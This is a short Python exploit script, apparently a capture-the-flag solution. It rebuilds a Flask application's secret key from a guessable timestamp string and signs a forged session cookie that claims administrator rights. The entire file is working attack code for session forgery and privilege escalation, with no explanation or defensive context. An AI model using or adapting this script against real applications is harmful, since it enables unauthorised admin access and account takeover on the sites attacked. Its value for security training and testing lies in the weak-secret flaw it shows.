import itsdangerous
import hashlib
import uuid

server_start_str = '20240921192014'
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()

# Flask session serializer
serializer = itsdangerous.URLSafeTimedSerializer(secure_key)

namespace = uuid.UUID('31333337-1337-1337-1337-133713371337')
name = 'administrator'
generated_uuid = uuid.uuid5(namespace, name)

session_data = {
    'is_admin': True,
    'uid': str(generated_uuid),
    'username': 'administrator'
}

cookie_value = serializer.dumps(session_data)
print("Forged Cookie Value:", cookie_value)